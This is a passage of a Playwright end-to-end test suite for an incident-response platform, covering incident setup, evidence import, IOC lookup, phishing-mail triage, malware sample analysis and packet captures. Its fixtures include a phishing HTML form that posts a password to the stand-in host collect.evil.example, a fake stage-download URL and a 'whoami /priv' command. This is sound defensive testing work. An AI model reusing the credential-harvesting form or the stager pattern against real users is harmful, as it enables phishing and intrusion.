import { readFileSync } from 'node:fs'
import { test, expect } from '@playwright/test'
import { buildSamplePe, phishingEml } from './helpers.js'

/*
 * Smoke test of the whole stack, as an analyst would use it on a fresh
 * install: create the first (admin) account, sign in, open an incident, drop
 * the evidence files of each tab (e2e/fixtures/) and check that the timeline
 * merges their events. One browser context is shared by the steps, in order.
 */

const ADMIN = { username: 'admin', password: 'supersecret' }

// No retries: the steps share one server and one account, so a retry from the
// first step can only fail ("first run" is over) and hide the real error.
test.describe.configure({ mode: 'serial', retries: 0 })

let page
// What the Content-Security-Policy blocked, if anything: the suite ends by checking it is empty.
const blocked = []

/** Drop a fixture file on the app, as from the file manager, and import it where Nik proposes. */
async function dropFixture(name) {
  const content = readFileSync(new URL(`./fixtures/${name}`, import.meta.url), 'utf8')
  const transfer = await page.evaluateHandle(
    ([fileName, text]) => {
      const data = new DataTransfer()
      data.items.add(new File([text], fileName))
      return data
    },
    [name, content],
  )
  await page.dispatchEvent('main', 'dragenter', { dataTransfer: transfer })
  await page.dispatchEvent('main', 'drop', { dataTransfer: transfer })
  const dialog = page.getByRole('dialog', { name: 'Add a file' })
  await expect(dialog).toBeVisible()
  await dialog.getByRole('button', { name: 'Import' }).click()
  await expect(dialog).toBeHidden()
}

test.beforeAll(async ({ browser }) => {
  page = await browser.newPage()
  page.on('pageerror', (error) => {
    throw new Error(`Uncaught error in the page: ${error.message}`)
  })
  page.on('console', (message) => {
    if (/Content Security Policy|Content-Security-Policy/i.test(message.text())) blocked.push(message.text())
  })
})

test.afterAll(async () => {
  await page.close()
})

test('first run creates the admin account', async () => {
  await page.goto('/')
  await expect(page.getByText('first run')).toBeVisible()
  await page.fill('#setup-username', ADMIN.username)
  await page.fill('#setup-password', ADMIN.password)
  await page.fill('#setup-confirm', ADMIN.password)
  await page.click('button[type=submit]')
  await expect(page.locator('#login-username')).toBeVisible()
})

test('the admin signs in and sees the empty dashboard', async () => {
  await page.fill('#login-username', ADMIN.username)
  await page.fill('#login-password', ADMIN.password)
  await page.click('button[type=submit]')
  await expect(page.getByText('No active incident')).toBeVisible()
})

test('a new incident opens on its summary', async () => {
  await page.click('aside >> text=New incident')
  await page.fill('#new-host', 'WKS-FINANCE-01')
  await page.fill('#new-username', 'm.rossi')
  await page.click('button[type=submit]:has-text("Create incident")')
  await expect(page.getByText('Incident details')).toBeVisible()
  await expect(page.locator('aside nav[aria-label="Incidents"]')).toContainText('WKS-FINANCE-01')
})

test('the tab bar fits the window and every tab keeps its name', async () => {
  const nav = page.locator('nav[aria-label="Analysis tabs"]')
  const fits = () => nav.evaluate((element) => element.scrollWidth <= element.clientWidth + 1)
  const original = page.viewportSize()
  for (const width of [original.width, 1000]) {
    await page.setViewportSize({ width, height: original.height })
    // Shorter labels, then icons only: the bar never needs to scroll sideways.
    await expect.poll(fits).toBe(true)
    await expect(nav.getByRole('button', { name: 'Command History', exact: true })).toBeVisible()
  }
  await page.setViewportSize(original)
  // Controls side by side share one height.
  const heights = await page
    .locator('header button, header div.border')
    .evaluateAll((elements) => [...new Set(elements.filter((e) => e.offsetHeight).map((e) => e.offsetHeight))])
  expect(heights).toEqual([36])
})

test('evidence files dropped on the app fill the analysis tabs', async () => {
  const current = page.locator('nav[aria-label="Analysis tabs"] [aria-current="page"]')
  const files = [
    ['Bookmarks', 'Browser Forensics', /^Bookmarks/],
    ['bash_history', 'Command History'],
    ['bam-export.csv', 'Endpoint Artifacts'],
    ['nik-eventlogs.json', 'Event Logs'],
  ]
  for (const [name, tab, section] of files) {
    await dropFixture(name)
    await expect(current).toContainText(tab)
    if (section) {
      await page
        .getByRole('navigation', { name: 'Browser analysis sections' })
        .getByRole('button', { name: section })
        .click()
    }
    await expect(page.locator('tbody tr').first()).toBeVisible({ timeout: 20_000 })
  }
})

test('the timeline merges the events of every tab', async () => {
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Timeline', exact: true }).click()
  await expect(page.locator('tbody tr').first()).toBeVisible()
  const counter = page.getByText(/of \d+ results/)
  await expect(counter).toBeVisible()
  expect(await counter.textContent()).not.toMatch(/of 0 results/)
  for (const source of ['Bash', 'Security']) {
    await expect(page.locator('tbody').getByText(source).first()).toBeVisible()
  }
})

test('the IOCs tab gathers the indicators and shows where they were seen', async () => {
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'IOCs', exact: true }).click()
  const attacker = page.getByRole('button', { name: '185.220.101.47', exact: true })
  await expect(attacker).toBeVisible({ timeout: 20_000 })
  await attacker.click()
  const dialog = page.getByRole('dialog', { name: 'Where seen' })
  await expect(dialog).toContainText('WKS-FINANCE-01')
  // External reputation: keyless providers are ready; nothing is sent until asked.
  const reputation = dialog.getByRole('region', { name: 'External reputation' })
  await expect(reputation.getByRole('button', { name: 'Check now' })).toBeVisible()
  await expect(reputation).toContainText('Not checked yet')
  await page.keyboard.press('Escape')
})

test('threat intelligence is configured in Settings, keys never shown', async () => {
  await page.getByRole('button', { name: 'Open platform settings' }).click()
  const settings = page.getByRole('dialog', { name: 'Settings' })
  await settings.getByRole('navigation', { name: 'Settings sections' }).getByText('Threat intelligence').click()
  const ips = settings.getByRole('switch', { name: /IP addresses/ })
  await expect(ips).not.toBeChecked()
  await ips.check()
  await expect(ips).toBeChecked()
  await settings.getByLabel('VirusTotal API key').fill('e2e-virustotal-key-0042')
  await settings
    .getByRole('listitem')
    .filter({ hasText: 'VirusTotal' })
    .getByRole('button', { name: 'Save key' })
    .click()
  await expect(settings.getByText('key …0042')).toBeVisible()
  await expect(settings.getByLabel('VirusTotal API key')).toHaveValue('')
  await ips.uncheck()
  await settings.getByRole('button', { name: 'Close' }).click()
})

test('right-click on an indicator adds it to the allowlist, with undo', async () => {
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'IOCs', exact: true }).click()
  const value = page.getByRole('button', { name: '185.220.101.47', exact: true })
  await expect(value).toBeVisible({ timeout: 20_000 })
  await value.click({ button: 'right' })
  const menu = page.getByRole('menu')
  await expect(menu).toContainText('Where else was this seen?')
  await menu.getByRole('menuitem', { name: 'Add to the allowlist…' }).click()
  const dialog = page.getByRole('dialog', { name: 'Add to the allowlist' })
  await expect(dialog).toContainText('185.220.101.0/24')
  await dialog.getByRole('button', { name: 'Add to the allowlist' }).click()
  await expect(value).toBeHidden({ timeout: 10_000 })
  await page.getByRole('button', { name: 'Undo' }).click()
  await expect(value).toBeVisible({ timeout: 10_000 })
})

test('a file dropped anywhere goes to the right tab', async () => {
  const transfer = await page.evaluateHandle(() => {
    const data = new DataTransfer()
    data.items.add(new File(['#1762500000\nwhoami /priv\n'], '.zsh_history', { type: 'text/plain' }))
    return data
  })
  await page.dispatchEvent('main', 'dragenter', { dataTransfer: transfer })
  await page.dispatchEvent('main', 'drop', { dataTransfer: transfer })
  const dialog = page.getByRole('dialog', { name: 'Add a file' })
  await expect(dialog).toContainText('Shell history')
  await expect(dialog.getByLabel('Shell')).toHaveValue('zsh')
  await dialog.getByRole('button', { name: 'Import' }).click()
  await expect(page.locator('nav[aria-label="Analysis tabs"] [aria-current="page"]')).toContainText('Command History')
  await expect(page.getByText('whoami /priv').first()).toBeVisible()
})

test('the search palette finds indicators and runs actions', async () => {
  await page.keyboard.press('ControlOrMeta+k')
  const palette = page.getByRole('dialog', { name: 'Search' })
  await expect(palette).toBeVisible()
  await palette.getByRole('textbox', { name: 'Search' }).fill('185.220.101')
  await expect(palette.getByRole('option', { name: /185\.220\.101\.47/ }).first()).toBeVisible()
  // ">" lists actions: jump to the Timeline tab.
  await palette.getByRole('textbox', { name: 'Search' }).fill('> timeline')
  await page.keyboard.press('Enter')
  await expect(palette).toBeHidden()
  await expect(page.locator('nav[aria-label="Analysis tabs"] [aria-current="page"]')).toContainText('Timeline')
})

test('the incident report is built by the server and previewed', async () => {
  await page.getByRole('button', { name: 'Incident report' }).click()
  const dialog = page.getByRole('dialog', { name: 'Incident report' })
  await dialog.getByRole('textbox').fill('Phishing e-mail, then a remote shell.')
  await dialog.getByRole('button', { name: 'Preview' }).click()
  const frame = page.frameLocator('iframe[title="Report preview"]')
  await expect(frame.getByRole('heading', { name: 'Incident report' })).toBeVisible({ timeout: 20_000 })
  await expect(frame.getByText('Phishing e-mail, then a remote shell.')).toBeVisible()
  // By default the report lists only what was flagged: nothing yet.
  await expect(frame.getByText('what the analysts flagged')).toBeVisible()
  await expect(frame.getByText('Nothing was flagged here.').first()).toBeVisible()
  await expect(frame.getByText('185.220.101.47').first()).toBeHidden()
  // "Include everything" brings back the whole incident.
  await dialog.getByRole('checkbox', { name: /^Include everything/ }).check()
  await dialog.getByRole('button', { name: 'Preview' }).click()
  await expect(frame.getByText('everything in the incident')).toBeVisible({ timeout: 20_000 })
  await expect(frame.getByText('185.220.101.47').first()).toBeVisible()
  await dialog.getByRole('checkbox', { name: /^Include everything/ }).uncheck()
  await page.keyboard.press('Escape')
})

test('a sample is stored, analysed and shown with its indicators', async () => {
  // With the real workers this test waits for rizin, two capa rule checks
  // (~10 s each) and a second capa run: more than the 60 s default.
  if (process.env.E2E_ANALYZER_URL || process.env.E2E_CAPA_URL) test.setTimeout(300_000)
  await page
    .locator('nav[aria-label="Analysis tabs"]')
    .getByRole('button', { name: 'Malware Analysis', exact: true })
    .click()
  await expect(page.getByText('No samples yet')).toBeVisible()
  await page.getByRole('button', { name: 'Upload malware samples' }).locator('input[type=file]').setInputFiles({
    name: 'invoice_0423.pdf.exe',
    mimeType: 'application/octet-stream',
    buffer: buildSamplePe(),
  })
  await expect(page.getByRole('list', { name: 'Samples' })).toContainText('invoice_0423.pdf.exe')
  await expect(page.getByText('PE32 executable, Intel 80386').first()).toBeVisible()
  await expect(page.locator('dd', { hasText: /^[0-9a-f]{64}/ }).first()).toBeVisible()
  await page.getByRole('tab', { name: /^IOC/ }).click()
  await expect(page.locator('tbody tr', { hasText: 'gate.php' })).toBeVisible()
  await expect(page.getByText('process injection').first()).toBeVisible()
  // Structure (parsed by pefile) and YARA (built-in injection rule) views.
  await page.getByRole('tab', { name: 'Structure' }).click()
  await expect(page.getByText('windows gui')).toBeVisible()
  await expect(page.locator('tbody tr', { hasText: '.text' })).toBeVisible()
  await page.getByRole('tab', { name: /^YARA/ }).click()
  await expect(page.getByText('pe_process_injection_apis')).toBeVisible()
  // Code view: rizin in CI (analyzer container), "not configured" elsewhere.
  await page.getByRole('tab', { name: 'Code' }).click()
  if (process.env.E2E_ANALYZER_URL) {
    // Recognised code (here the entry stub, runtime) is hidden by default; the
    // helper uses the URL, so it is where to start.
    await expect(page.locator('tbody tr', { hasText: 'fcn.0040100f' })).toBeVisible({ timeout: 60_000 })
    await expect(page.locator('tbody tr', { hasText: 'entry0' })).toHaveCount(0)
    await expect(page.getByRole('region', { name: 'Start here' })).toContainText('gate.php')
    await page.getByLabel(/Hide recognised library code/).uncheck()
    await expect(page.locator('tbody tr', { hasText: 'entry0' })).toBeVisible()
    await page.getByRole('tab', { name: 'Control flow' }).click()
    const cfg = page.locator('svg[aria-label^="Control flow of entry0"]')
    await expect(cfg).toBeVisible({ timeout: 30_000 })
    await expect(cfg).toContainText('push')
    await expect(cfg.locator('g.cursor-pointer')).toHaveCount(3) // three basic blocks
    // Pseudo-C from rz-ghidra, decompiled by the analysis; the call to the helper is a
    // link that opens the helper's own pseudo-C.
    await page.getByRole('tab', { name: 'Decompiled' }).click()
    const code = page.locator('pre', { hasText: 'entry0' })
    await expect(code).toContainText('void entry0(void)', { timeout: 30_000 })
    await expect(page.getByText('from the analysis')).toBeVisible()
    await code.getByRole('button', { name: 'fcn.0040100f' }).click()
    await expect(page.locator('pre', { hasText: 'fcn.0040100f(void)' })).toContainText('return 0;', {
      timeout: 60_000,
    })
    // Switching functions with a graph open: the new graph (no calls) must not be
    // drawn with the previous function's layout (one edge) while ELK recomputes.
    await page.getByRole('tab', { name: 'Call graph' }).click()
    const rows = page.locator('tbody tr')
    for (const name of ['entry0', 'fcn.0040100f', 'entry0', 'fcn.0040100f']) {
      await rows.filter({ hasText: name }).first().click()
      await expect(page.locator(`svg[aria-label^="Calls from ${name}"]`)).toBeVisible({ timeout: 30_000 })
    }
    // Rename the helper: the new name replaces rizin's in the list and in the caller's pseudo-C.
    await page.getByRole('button', { name: 'Rename / comment' }).click()
    await page.getByLabel(/^Name/).fill('send_beacon')
    await page.getByLabel('Comment', { exact: true }).fill('Loads the C2 URL')
    await page.getByRole('button', { name: 'Save' }).click()
    await expect(page.getByText('Loads the C2 URL')).toBeVisible()
    await expect(rows.filter({ hasText: 'send_beacon' })).toBeVisible()
    await rows.filter({ hasText: 'entry0' }).first().click()
    await page.getByRole('tab', { name: 'Decompiled' }).click()
    await expect(page.locator('pre').getByRole('button', { name: 'send_beacon' })).toBeVisible({ timeout: 30_000 })
    // The IOC table links the URL to the function that uses it.
    await page.getByRole('tab', { name: /^IOC/ }).click()
    await page.locator('tbody tr', { hasText: 'gate.php' }).getByRole('button', { name: 'send_beacon' }).click()
    await expect(page.locator('svg[aria-label^="Calls from send_beacon"]')).toBeVisible({ timeout: 30_000 })
  } else {
    await expect(page.getByText('The analyzer worker is not configured.')).toBeVisible()
  }
  // Capabilities view: real capa in CI (capa container), "not configured" elsewhere.
  // The smoke sample is too small to match any capa rule.
  await page.getByRole('tab', { name: /^Capabilities/ }).click()
  if (process.env.E2E_CAPA_URL) {
    await expect(page.getByText('capa found no capabilities in this sample.')).toBeVisible({ timeout: 120_000 })
    await expect(page.getByText('capa 10.0.0')).toBeVisible()
    // An admin capa rule: checked by the worker, matched after Re-analyse, marked custom.
    await page.getByRole('button', { name: 'Open platform settings' }).click()
    const settings = page.getByRole('dialog', { name: 'Settings' })
    await settings.getByRole('navigation', { name: 'Settings sections' }).getByText('capa rules').click()
    await settings.getByRole('button', { name: 'Add rule' }).click()
    await settings
      .getByLabel('capa rule (YAML)')
      .fill(
        'rule:\n  meta:\n    name: reference team C2 gate\n    namespace: team/c2\n    authors:\n      - e2e\n' +
          '    scopes:\n      static: file\n      dynamic: file\n  features:\n    - string: /gate\\.php/\n',
      )
    await settings.getByRole('button', { name: 'Validate' }).click()
    await expect(settings.getByText('Valid: reference team C2 gate')).toBeVisible({ timeout: 60_000 })
    await settings.getByRole('button', { name: 'Save rule' }).click()
    await expect(settings.getByRole('button', { name: 'Delete reference team C2 gate' })).toBeVisible({
      timeout: 60_000,
    })
    await settings.getByRole('button', { name: 'Close' }).click()
    await page.getByRole('button', { name: 'Re-analyse' }).click()
    await page.getByRole('tab', { name: /^Capabilities/ }).click()
    const custom = page.locator('tbody tr', { hasText: 'reference team C2 gate' })
    await expect(custom).toBeVisible({ timeout: 120_000 })
    await expect(custom.getByText('custom', { exact: true })).toBeVisible()
  } else {
    await expect(page.getByText('The capa worker is not configured.')).toBeVisible()
  }
})

test('a reported e-mail is triaged: verdict, sandboxed body, attachment sent to Malware Analysis', async () => {
  const eml = phishingEml()
  const transfer = await page.evaluateHandle((text) => {
    const data = new DataTransfer()
    data.items.add(new File([text], 'reported.eml', { type: 'message/rfc822' }))
    return data
  }, eml)
  await page.dispatchEvent('main', 'dragenter', { dataTransfer: transfer })
  await page.dispatchEvent('main', 'drop', { dataTransfer: transfer })
  const dialog = page.getByRole('dialog', { name: 'Add a file' })
  await expect(dialog).toContainText('E-mail (.eml)')
  await dialog.getByRole('button', { name: 'Import' }).click()
  await expect(page.locator('nav[aria-label="Analysis tabs"] [aria-current="page"]')).toContainText('Mail Analysis')
  await expect(page.getByRole('list', { name: 'Messages' })).toContainText('Your account will be suspended', {
    timeout: 60_000,
  })
  await expect(page.getByText('the sender domain paypai.example imitates paypal')).toBeVisible()
  await expect(page.getByText(/^phishing · \d+$/)).toBeVisible()
  await expect(page.locator('aside nav[aria-label="Incidents"]').getByLabel('Holds e-mails')).toBeVisible()
  // The body is drawn in a frame that runs nothing and follows no link.
  await page.getByRole('tab', { name: 'Body' }).click()
  const frame = page.locator('iframe[title="Message body (sandboxed)"]')
  await expect(frame).toHaveAttribute('sandbox', '')
  await expect(page.getByText('1 hidden')).toBeVisible()
  const body = page.frameLocator('iframe[title="Message body (sandboxed)"]')
  await expect(body.getByText('Verify your account immediately.')).toBeVisible()
  await expect(body.locator('script')).toHaveCount(0)
  await expect(body.locator('a[href]')).toHaveCount(0)
  await page.getByRole('tab', { name: /^Links/ }).click()
  await expect(page.locator('tbody tr', { hasText: 'login-paypa1.top' })).toContainText('text ≠ target')
  await page.getByRole('tab', { name: /^Attachments/ }).click()
  await expect(page.getByText('double extension .pdf.exe')).toBeVisible()
  await page.getByRole('button', { name: 'Hex' }).click()
  await expect(page.getByText('00000000  4d 5a 00 00')).toBeVisible()
  await page.getByRole('button', { name: 'Send to Malware Analysis' }).click()
  const toast = page.getByRole('status').filter({ hasText: 'invoice.pdf.exe is now a sample of this incident.' })
  await toast.getByRole('button', { name: 'Open', exact: true }).click()
  await expect(page.getByRole('list', { name: 'Samples' })).toContainText('invoice.pdf.exe')
})

test('attachments are previewed by the isolated workers', async () => {
  const pdf =
    '%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n' +
    '3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 300 200]>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n'
  const html =
    '<html><head><title>Sign in</title></head><body><form action="https://collect.evil.example/p">' +
    '<input name="pw"></form><img src="https://cdn.evil.example/logo.png"></body></html>'
  const eml = [
    'From: Billing <billing@invoices.example>',
    'To: m.rossi@contoso.example',
    'Subject: Statement and secure link',
    'MIME-Version: 1.0',
    'Content-Type: multipart/mixed; boundary="b2"',
    '',
    '--b2',
    'Content-Type: text/plain',
    '',
    'See the attached statement.',
    '--b2',
    'Content-Type: application/pdf; name="statement.pdf"',
    'Content-Disposition: attachment; filename="statement.pdf"',
    'Content-Transfer-Encoding: base64',
    '',
    Buffer.from(pdf).toString('base64'),
    '--b2',
    'Content-Type: text/html; name="secure.html"',
    'Content-Disposition: attachment; filename="secure.html"',
    'Content-Transfer-Encoding: base64',
    '',
    Buffer.from(html).toString('base64'),
    '--b2--',
    '',
  ].join('\r\n')
  await page
    .locator('nav[aria-label="Analysis tabs"]')
    .getByRole('button', { name: 'Mail Analysis', exact: true })
    .click()
  await page
    .getByRole('button', { name: 'Upload e-mails' })
    .locator('input[type=file]')
    .setInputFiles({ name: 'statement.eml', mimeType: 'message/rfc822', buffer: Buffer.from(eml) })
  await page.getByRole('list', { name: 'Messages' }).getByText('Statement and secure link').click()
  await page.getByRole('tab', { name: /^Attachments/ }).click()
  const preview = page.getByRole('button', { name: 'Preview' })
  const browse = page.getByRole('button', { name: 'Open in isolated browser' })
  if (process.env.E2E_DOCVIEW_URL) {
    await preview.click()
    await expect(page.getByRole('img', { name: 'Page 1 of statement.pdf' })).toBeVisible({ timeout: 60_000 })
    await page.keyboard.press('Escape')
  } else {
    await expect(preview).toBeDisabled()
  }
  if (process.env.E2E_BROWSER_URL) {
    await browse.click()
    await page
      .getByRole('dialog', { name: 'Open in the isolated browser' })
      .getByRole('button', { name: 'Open' })
      .click()
    const remote = page.getByRole('dialog', { name: /^Isolated browser/ })
    await expect(remote.getByRole('application', { name: /Remote page/ })).toBeVisible({ timeout: 60_000 })
    await expect(remote).toContainText('no network')
    await expect(remote).toContainText(/request(s)? refused/)
    // The Network panel lists the refused requests (the page's image, its form target).
    await remote.getByRole('button', { name: /^Network/ }).click()
    await expect(remote.locator('tbody tr', { hasText: 'logo.png' })).toContainText('blocked')
    await remote.getByRole('button', { name: 'Close' }).click()
    // The session becomes a capture of the incident.
    await page
      .locator('nav[aria-label="Analysis tabs"]')
      .getByRole('button', { name: 'Network Analysis', exact: true })
      .click()
    await expect(page.getByRole('list', { name: 'Captures' })).toContainText('attachment secure.html', {
      timeout: 30_000,
    })
  } else {
    await expect(browse).toBeDisabled()
  }
})

test('a packet capture opens as in Wireshark', async () => {
  await page
    .locator('nav[aria-label="Analysis tabs"]')
    .getByRole('button', { name: 'Network Analysis', exact: true })
    .click()
  await page
    .getByRole('button', { name: 'Upload packet captures' })
    .locator('input[type=file]')
    .setInputFiles('e2e/fixtures/phish.pcapng')
  await expect(page.getByRole('list', { name: 'Captures' })).toContainText('phish.pcapng')
  await page.getByRole('list', { name: 'Captures' }).getByText('phish.pcapng').click()
  if (!process.env.E2E_PCAP_URL) {
    await expect(page.getByText('stored, not analysed')).toBeVisible()
    return
  }
  const packets = page.getByRole('table', { name: 'Packets' })
  await expect(packets.locator('tbody tr').first()).toBeVisible({ timeout: 120_000 })
  // A Wireshark display filter, then the packet's tree and its bytes.
  await page.getByLabel('Display filter').fill('http.request.method == "POST"')
  await page.getByRole('button', { name: 'Apply', exact: true }).click()
  await expect(packets.locator('tbody tr')).toHaveCount(1)
  await packets.locator('tbody tr').first().click()
  const tree = page.getByRole('tree', { name: 'Packet details' })
  await expect(tree).toContainText('Hypertext Transfer Protocol')
  await tree.getByText('Hypertext Transfer Protocol').click()
  await expect(page.getByLabel('Packet bytes').locator('.bg-accent').first()).toBeVisible()
  // Follow the HTTP stream: the credentials in clear.
  await page.getByRole('button', { name: /^Follow HTTP stream/ }).click()
  await expect(page.getByLabel('Stream content')).toContainText('pass=Winter2026')
  await page.keyboard.press('Escape')
  // Export Objects and the summary.
  await page.getByRole('tab', { name: 'Objects' }).click()
  await expect(page.locator('tbody tr', { hasText: 'invoice.exe' })).toBeVisible()
  await page.getByRole('tab', { name: 'Summary' }).click()
  await expect(page.getByText('6 connections every 30 s')).toBeVisible()
})

test('a file is analysed on its own, tagged, then linked to the incident', async () => {
  await page.getByRole('button', { name: 'Artifacts', exact: true }).click()
  const panel = page.getByRole('complementary', { name: 'Artifacts panel' })
  await panel.getByRole('button', { name: 'New analysis' }).click()
  await page
    .getByRole('dialog', { name: 'New analysis' })
    .locator('input[type=file]')
    .setInputFiles({
      name: 'dropper.bin',
      mimeType: 'application/octet-stream',
      buffer: Buffer.from('MZ analysed on its own http://198.51.100.9/stage.bin'),
    })
  // Nik asks where it goes, with "Start analysis" chosen.
  const place = page.getByRole('dialog', { name: 'Add a file' })
  await expect(place.getByRole('radio', { name: /^Start analysis/ })).toBeChecked()
  await place.getByRole('button', { name: 'Start analysis' }).click()

  const artifact = page.getByRole('region', { name: 'Artifact' })
  await expect(artifact.getByRole('heading', { name: 'dropper.bin' })).toBeVisible({ timeout: 30_000 })
  await expect(artifact).toContainText('Not linked to an incident.')
  await expect(panel.getByRole('navigation', { name: 'Artifacts' })).toContainText('dropper.bin')
  // The same analysis views as in an incident, without the incident-only actions.
  await expect(page.getByRole('button', { name: 'Download zip' })).toBeVisible()
  await expect(page.getByRole('button', { name: 'Remove', exact: true })).toHaveCount(0)

  await artifact.getByRole('button', { name: 'Add tags' }).click()
  await artifact.getByLabel('Tags').fill('Emotet campaign:q4')
  await artifact.getByRole('button', { name: 'Save' }).click()
  await expect(artifact).toContainText('#emotet')
  await panel.getByLabel('Filter artifacts').fill('campaign')
  await expect(panel.getByRole('navigation', { name: 'Artifacts' })).toContainText('dropper.bin')
  await panel.getByLabel('Filter artifacts').fill('')

  await artifact.getByRole('button', { name: 'Link to incident' }).click()
  await page
    .getByRole('dialog', { name: 'Link to incident' })
    .getByRole('button', { name: 'Link', exact: true })
    .click()
  const linked = artifact.getByRole('button', { name: 'WKS-FINANCE-01 - m.rossi', exact: true })
  await expect(linked).toBeVisible()
  // The incident now holds the sample.
  await linked.click()
  await page
    .locator('nav[aria-label="Analysis tabs"]')
    .getByRole('button', { name: 'Malware Analysis', exact: true })
    .click()
  await expect(page.getByRole('list', { name: 'Samples' })).toContainText('dropper.bin', { timeout: 20_000 })

  // Dropped again, the file is recognised as already analysed.
  const transfer = await page.evaluateHandle(() => {
    const data = new DataTransfer()
    data.items.add(new File(['MZ analysed on its own http://198.51.100.9/stage.bin'], 'again.bin'))
    return data
  })
  await page.dispatchEvent('main', 'dragenter', { dataTransfer: transfer })
  await page.dispatchEvent('main', 'drop', { dataTransfer: transfer })
  await expect(page.getByRole('dialog', { name: 'Add a file' })).toContainText('This file was already analysed.')
  await page.keyboard.press('Escape')
  await page.getByRole('button', { name: 'Incidents', exact: true }).click()
})

test('an address is scanned on its own, then linked to the incident', async () => {
  if (process.env.E2E_BROWSER_URL) test.setTimeout(180_000)
  await page.getByRole('button', { name: 'Artifacts', exact: true }).click()
  const panel = page.getByRole('complementary', { name: 'Artifacts panel' })
  await panel.getByRole('button', { name: 'New analysis' }).click()
  const dialog = page.getByRole('dialog', { name: 'New analysis' })
  // Addresses on the organisation's network are refused before anything is opened.
  await dialog.getByLabel('or an address to scan').fill('http://192.168.1.10/admin')
  await dialog.getByRole('button', { name: 'Scan address' }).click()
  await expect(dialog.getByRole('alert')).toContainText('Not scanned')
  // Defanged text is understood.
  await dialog.getByLabel('or an address to scan').fill('hxxps://nik-e2e-scan[.]invalid/login')
  await dialog.getByRole('button', { name: 'Scan address' }).click()

  const artifact = page.getByRole('region', { name: 'Artifact' })
  await expect(artifact.getByRole('heading', { name: 'nik-e2e-scan.invalid/login' })).toBeVisible({ timeout: 30_000 })
  await expect(panel.getByRole('navigation', { name: 'Artifacts' })).toContainText('nik-e2e-scan.invalid/login')
  if (process.env.E2E_BROWSER_URL) {
    // The isolated browser visited it: a verdict with its reasons, and the visit's capture.
    await expect(page.getByText('WHY THIS VERDICT')).toBeVisible({ timeout: 120_000 })
    await expect(page.getByText('HOW THE BROWSER GOT THERE')).toBeVisible()
    await expect(artifact).toContainText('browser session')
  } else {
    await expect(page.getByText('The address was not visited.', { exact: true })).toBeVisible({ timeout: 30_000 })
    await expect(page.getByText(/isolated browser is not configured/)).toBeVisible()
  }

  await artifact.getByRole('button', { name: 'Link to incident' }).click()
  await page
    .getByRole('dialog', { name: 'Link to incident' })
    .getByRole('button', { name: 'Link', exact: true })
    .click()
  await artifact.getByRole('button', { name: 'WKS-FINANCE-01 - m.rossi', exact: true }).click()
  await page
    .locator('nav[aria-label="Analysis tabs"]')
    .getByRole('button', { name: 'URL Analysis', exact: true })
    .click()
  await expect(page.getByRole('list', { name: 'Addresses' })).toContainText('nik-e2e-scan.invalid/login', {
    timeout: 20_000,
  })
  await page.getByRole('button', { name: 'Incidents', exact: true }).click()
})

test('right-click works on lists, indicators and artifacts', async () => {
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')
  const menu = page.getByRole('menu')

  // A sample in the incident's list: its own actions, and the flag.
  await tabs.getByRole('button', { name: 'Malware Analysis', exact: true }).click()
  const samples = page.getByRole('list', { name: 'Samples' })
  await samples.getByText('dropper.bin').click({ button: 'right' })
  await expect(menu).toContainText('Open as an artifact')
  await expect(menu).toContainText('Remove from the incident')
  await menu.getByRole('menuitem', { name: 'Flag the sample' }).click()
  await expect(samples.getByLabel('Flagged')).toHaveCount(1)

  // An indicator is flagged by hand from its menu, wherever it is shown.
  await tabs.getByRole('button', { name: 'IOCs', exact: true }).click()
  const address = page.getByRole('button', { name: '185.220.101.47', exact: true })
  await expect(address).toBeVisible({ timeout: 20_000 })
  // The list reloads after the flag above: a menu closes when the page moves under it.
  await page.waitForLoadState('networkidle')
  await address.click({ button: 'right' })
  await menu.getByRole('menuitem', { name: 'Flag the indicator' }).click()
  await tabs.getByRole('button', { name: 'Summary', exact: true }).click()
  await expect(page.locator('ol li', { hasText: '185.220.101.47' }).first()).toBeVisible()
  await expect(page.locator('ol li', { hasText: 'dropper.bin' }).first()).toBeVisible()
  // A flagged item on the Summary has the menu too.
  await page.locator('ol li', { hasText: 'dropper.bin' }).first().click({ button: 'right' })
  await expect(menu).toContainText('Remove the flag')
  await page.keyboard.press('Escape')

  // An artifact in the panel.
  await page.getByRole('button', { name: 'Artifacts', exact: true }).click()
  const panel = page.getByRole('complementary', { name: 'Artifacts panel' })
  await panel.getByRole('navigation', { name: 'Artifacts' }).getByText('dropper.bin').click({ button: 'right' })
  await expect(menu).toContainText('Copy link')
  await expect(menu).toContainText('Where else was this seen?')
  await page.keyboard.press('Escape')
  await page.getByRole('button', { name: 'Incidents', exact: true }).click()
})

test('pasted text is recognised: an address to scan, an indicator to look up', async () => {
  const paste = (text) =>
    page.evaluate((value) => {
      const data = new DataTransfer()
      data.setData('text/plain', value)
      document.body.dispatchEvent(new ClipboardEvent('paste', { clipboardData: data, bubbles: true }))
    }, text)
  const prompt = page.getByRole('dialog', { name: 'Pasted text' })

  // Ordinary text is left alone.
  await paste('just some words')
  await expect(prompt).toHaveCount(0)

  // A defanged address: read as it was meant, opened only if the analyst chooses.
  await paste('hxxps://nik-e2e-scan[.]invalid/login')
  await expect(prompt).toContainText('URL')
  await expect(prompt).toContainText('https://nik-e2e-scan.invalid/login')
  await expect(prompt.getByRole('button', { name: 'Analyse URL' })).toBeVisible()
  await prompt.getByRole('button', { name: 'Dismiss' }).click()
  await expect(prompt).toHaveCount(0)

  // An indicator: search it, or see where it was seen.
  await paste('185.220.101[.]47')
  await expect(prompt).toContainText('IP address')
  await prompt.getByRole('button', { name: 'Search in Nik' }).click()
  const palette = page.getByRole('dialog', { name: 'Search' })
  await expect(palette.getByRole('textbox', { name: 'Search' })).toHaveValue('185.220.101.47')
  await page.keyboard.press('Escape')
  await paste('185.220.101.47')
  await prompt.getByRole('button', { name: 'Where seen' }).click()
  await expect(page.getByRole('dialog', { name: 'Where seen' })).toContainText('WKS-FINANCE-01')
  await page.keyboard.press('Escape')
})

test('an incident has a status and an assignee, set from the panel and filtered there', async () => {
  const panel = page.locator('aside[aria-label="Incidents panel"]')
  const list = panel.locator('nav[aria-label="Incidents"]')
  const row = list.locator('li', { hasText: 'WKS-FINANCE-01' })
